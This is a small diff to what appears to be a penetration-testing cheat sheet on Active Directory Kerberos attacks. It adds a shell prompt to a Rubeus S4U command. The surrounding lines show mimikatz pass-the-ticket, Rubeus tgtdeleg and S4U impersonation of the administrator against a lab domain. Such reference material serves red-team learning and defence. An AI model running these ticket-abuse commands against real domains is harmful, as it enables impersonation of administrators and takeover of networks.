@@ -63,7 +63,7 @@ mimikatz# kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40
 PS C:\> Rubeus.exe tgtdeleg
 
 # ticket is the base64 ticket we get with `rubeus's tgtdeleg`
-Rubeus.exe s4u /ticket:doIFCDC[...]TE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+PS C:\> Rubeus.exe s4u /ticket:doIFCDC[...]TE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
 ```
 
 ## Kerberoasting
